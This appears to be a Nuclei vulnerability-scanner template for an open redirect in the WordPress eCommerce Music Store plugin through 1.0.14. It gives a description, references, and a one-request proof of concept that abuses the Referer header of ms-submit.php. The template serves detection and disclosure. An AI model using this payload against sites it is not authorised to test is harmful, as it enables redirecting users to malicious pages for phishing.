# Nuclei Template: WordPress eCommerce Music Store <=1.0.14 - Open Redirect
**Template ID:** music-store-open-redirect
**Vulnerability Class:** Open Redirect
**Severity:** Medium
**CWE:** CWE-601
**Source:** Nuclei Template (`music-store-open-redirect.yaml`)

## Vulnerability Information & PoC

## Description
WordPress eCommerce Music Store plugin through 1.0.14 contains an open redirect vulnerability via the referer header. An attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.

## Steps to reproduce / Exploit Payload
```http
GET /wp-content/plugins/music-store/ms-core/ms-submit.php HTTP/1.1
Host: {{Hostname}}
Referer: https://interact.sh
```

## References
- https://wpscan.com/vulnerability/d73f6575-eb86-480c-bde1-f8765870cdd1
- https://seclists.org/fulldisclosure/2015/Jul/113
